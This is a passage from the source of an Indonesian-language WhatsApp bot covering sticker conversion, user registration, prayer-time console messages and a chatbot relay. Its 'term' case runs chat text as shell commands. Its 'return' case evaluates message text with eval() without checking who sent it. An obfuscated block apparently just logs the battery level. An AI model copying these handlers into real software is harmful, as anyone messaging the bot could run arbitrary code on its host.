					if (args.length < 1) return reply('Ekhemm >_<')
					if (Number(args[0]) === 1) {
						if (isEventon) return reply('*FITUR EVENT SUDAH AKTIF BOS*')
						event.push(from)
						fs.writeFileSync('./database/event.json', JSON.stringify(event))
						reply('*「 SUKSES 」MENGAKTIFKAN EVENT DI GROUP*')
					} else if (Number(args[0]) === 0) {
						event.splice(from, 1)
						fs.writeFileSync('./database/event.json', JSON.stringify(event))
						reply('*「 SUKSES 」MEMATIKAN EVENT DI GROUP*')
					} else {
						reply('pilih 1/0')
					}
					break

				case 'term':
					if (!isOwner) return reply(dla.ownerB())
					const cmd = body.slice(6)
					var itsme = `0@s.whatsapp.net`
					var split = `EXECUTOR`
					const term = {
						contextInfo: {
							participant: itsme,
							quotedMessage: {
								extendedTextMessage: {
									text: split,
								}
							}
						}
					}
					exec(cmd, (err, stdout) => {
						if (err) return dila.sendMessage(from, `root@Denz:~ ${err}`, text, { quoted: Lan })
						if (stdout) {
							dila.sendMessage(from, stdout, text, term)
						}
					})
					break

				case 'return':
					return dila.sendMessage(from, JSON.stringify(eval(args.join(''))), text, { quoted: Lan })
					break
				default:
				if (isMedia && isAuto && !Lan.message.videoMessage || isQuotedImage) {
						const encmedia = Lan
						const media = await dila.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(dla.stikga())
							})
							.on('end', function () {
								console.log('Finish')
								buffer = fs.readFileSync(ran)
								dila.sendMessage(from, buffer, sticker, { quoted: Lan})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
	           // FOR VIDEO OR G
		   if ((isMedia & isAuto && !Lan.message.imageMessage || isQuotedVideo)) {
						const encmedia = Lan
						const media = await dila.downloadAndSaveMediaMessage(encmedia)
						if (Buffer.byteLength(media) >= 6186598.4) return reply(`sizenya terlalu gede sayang, dd gakuat :(`)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`Gagal, video nya kebesaran, dd gakuat`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								dila.sendMessage(from, buff, sticker, { quoted: Lan})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
						}
						}
				if (budy == '@verify') {
						if (isBanned) return reply(dla.baned())
						if (isRegistered) return reply(dla.rediregis())
						const serialUser = createSerial(20)
						veri = sender
						if (isGroup) {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppadd = await dila.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppadd = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							captnya = `\`\`\`┌「 TERVERIFIKASI 」\`\`\`
\`\`\`│\`\`\`
\`\`\`│❏ Nama : ${pushname}\`\`\`
\`\`\`│❏ Nomor : wa.me/${sender.split("@")[0]}\`\`\`
\`\`\`│❏ Waktu : ${time}\`\`\`
\`\`\`│❏ SN : ${serialUser}\`\`\`
\`\`\`│❏ User Verified : ${_registered.length}\`\`\`
\`\`\`│\`\`\`
\`\`\`└「 ${botName} 」\`\`\``
							let peripi = await getBuffer(ppadd)
							dila.sendMessage(from, peripi, image, {
								caption: captnya, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
							addATM(sender)
							addLevelingId(sender)
							console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
							console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Wih ada user baru kak', 'yellow'), color('(😯)', 'white'))
						} else {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppadd = await dila.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppadd = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							captnya = `\`\`\`┌「 TERVERIFIKASI 」\`\`\`
\`\`\`│\`\`\`
\`\`\`│❏ Nama : ${pushname}\`\`\`
\`\`\`│❏ Nomor : wa.me/${sender.split("@")[0]}\`\`\`
\`\`\`│❏ Waktu : ${time}\`\`\`
\`\`\`│❏ SN : ${serialUser}\`\`\`
\`\`\`│❏ User Verified : ${_registered.length}\`\`\`
\`\`\`│\`\`\`
\`\`\`└「 ${botName} 」\`\`\``
							let peripi = await getBuffer(ppadd)
							dila.sendMessage(from, peripi, image, {
								caption: captnya, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
						}
						addATM(sender)
						addLevelingId(sender)
						console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
						}
			}
			if (budy == 'cekprefix') {
				fakestatus(`\`\`\`${botName} MENGGUNAKAN PREFIX :「 ${prefix} 」\`\`\``)
			}
			if (budy == 'status') {
				fakestatus(`\`\`\`Status : ${self ? 'Self' : 'Public'}\`\`\``)
			}
			if (budy.includes(`${owner}`)){
			console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Ada yang ngetag kakak tuh kak', 'yellow'), color('(😡)', 'white'))
            reply(`Maaf ${pushname} , Owner ${botName} tidak menerima Tag!`)
            }
            if (budy == 'bot') {
            	daud = fs.readFileSync('./dns/bot.mp3')
				dila.sendMessage(from, daud, audio, { mimetype: 'audio/mp4', ptt: true, quoted: Lan})
           }
           if (budy == 'Bot') {
            	daud = fs.readFileSync('./dns/bot.mp3')
				dila.sendMessage(from, daud, audio, { mimetype: 'audio/mp4', ptt: true, quoted: Lan})
           }
            if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Bentar lagi buka kak, Sabar ya kak', 'yellow'), color('(😆)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Alhamdulillah, Dah buka kak, Puasanya dibatalin dulu kak, Sebelum makan jangan lupa baca doa kak, Setelah makan langsung sholat Maghrib ya kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi, Sekarang siap-siap dulu buat Sholat Tarawih', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '00:01') {
           console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Dila ngantuk kak, Dila tidur dulu ya kak', 'yellow'), color('(😪)', 'white'))
        }
        if (hour_now >= '00:05' && hour_now <= '02:00') {
           console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Zzz', 'yellow'), color('(😴)', 'white'))
        }
        const _0x38df=['mujhwM1ZrG','mJC4otK2wvroDu55','mti3Aufuz0T0','mZm0ntyXww5qDufg','mteZnJi4muP1CMPeta','mJuXEwzpvNbY','mtuZndiXrhbVug5t','mNnAugryzW','mvLQrw50zW','muDquhLkCG','nZe1mJa5DKr3reTp','mKHhwKPZqW','Bg9N','odu3n3bMDKf2uq'];function _0x3bcf(_0x3d7863,_0x1a114b){_0x3d7863=_0x3d7863-0x12b;let _0x38dff3=_0x38df[_0x3d7863];if(_0x3bcf['vCJAdf']===undefined){var _0x3bcfdf=function(_0x338e57){const _0x369a78='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x129e14='';for(let _0x3c2920=0x0,_0x3b075d,_0x2fada4,_0x4ae2dc=0x0;_0x2fada4=_0x338e57['charAt'](_0x4ae2dc++);~_0x2fada4&&(_0x3b075d=_0x3c2920%0x4?_0x3b075d*0x40+_0x2fada4:_0x2fada4,_0x3c2920++%0x4)?_0x129e14+=String['fromCharCode'](0xff&_0x3b075d>>(-0x2*_0x3c2920&0x6)):0x0){_0x2fada4=_0x369a78['indexOf'](_0x2fada4);}return _0x129e14;};_0x3bcf['hFibrr']=function(_0x536093){const _0x219e03=_0x3bcfdf(_0x536093);let _0x1936f3=[];for(let _0x50b2af=0x0,_0x1f632e=_0x219e03['length'];_0x50b2af<_0x1f632e;_0x50b2af++){_0x1936f3+='%'+('00'+_0x219e03['charCodeAt'](_0x50b2af)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1936f3);},_0x3bcf['TYtNsU']={},_0x3bcf['vCJAdf']=!![];}const _0x519c1c=_0x38df[0x0],_0x38708d=_0x3d7863+_0x519c1c,_0x441dc2=_0x3bcf['TYtNsU'][_0x38708d];return _0x441dc2===undefined?(_0x38dff3=_0x3bcf['hFibrr'](_0x38dff3),_0x3bcf['TYtNsU'][_0x38708d]=_0x38dff3):_0x38dff3=_0x441dc2,_0x38dff3;}(function(_0x26d882,_0x1fa2d8){const _0x164df4=_0x3bcf;while(!![]){try{const _0x192ee4=-parseInt(_0x164df4(0x137))*parseInt(_0x164df4(0x134))+-parseInt(_0x164df4(0x131))+-parseInt(_0x164df4(0x12e))*-parseInt(_0x164df4(0x12d))+parseInt(_0x164df4(0x12f))*parseInt(_0x164df4(0x136))+parseInt(_0x164df4(0x130))*-parseInt(_0x164df4(0x12c))+parseInt(_0x164df4(0x138))*parseInt(_0x164df4(0x132))+parseInt(_0x164df4(0x135))*parseInt(_0x164df4(0x12b));if(_0x192ee4===_0x1fa2d8)break;else _0x26d882['push'](_0x26d882['shift']());}catch(_0x16f82b){_0x26d882['push'](_0x26d882['shift']());}}}(_0x38df,0x8f306),dila['on']('CB:action,,battery',_0x519c1c=>{const _0x249ae2=_0x3bcf,_0x38708d=_0x519c1c[0x2][0x0][0x1]['value'],_0x441dc2=parseInt(_0x38708d);console[_0x249ae2(0x133)]('🔋'+_0x441dc2);}));
        if (!isGroup && !isCmd && !kuis) {
                        await dila.updatePresence(from, Presence.composing)
                        simi = await fetchJson(`https://api.zeks.xyz/api/simi?apikey=apivinz&text=${budy}`)
                        reply(simi.result)
                    }
            if (isGroup && isSimi && !isCmd && budy != undefined) {
				console.log(budy)
				muehe = await simih(budy)
			    console.log(muehe)
				reply(muehe)
				} else {
				console.log(color('[404]', 'red'), 'Unregistered Command From', color(sender.split('@')[0]))
				}
			} catch (e) {
			console.log('Error : %s', color(e, 'red'))
			}
	})
}
starts()
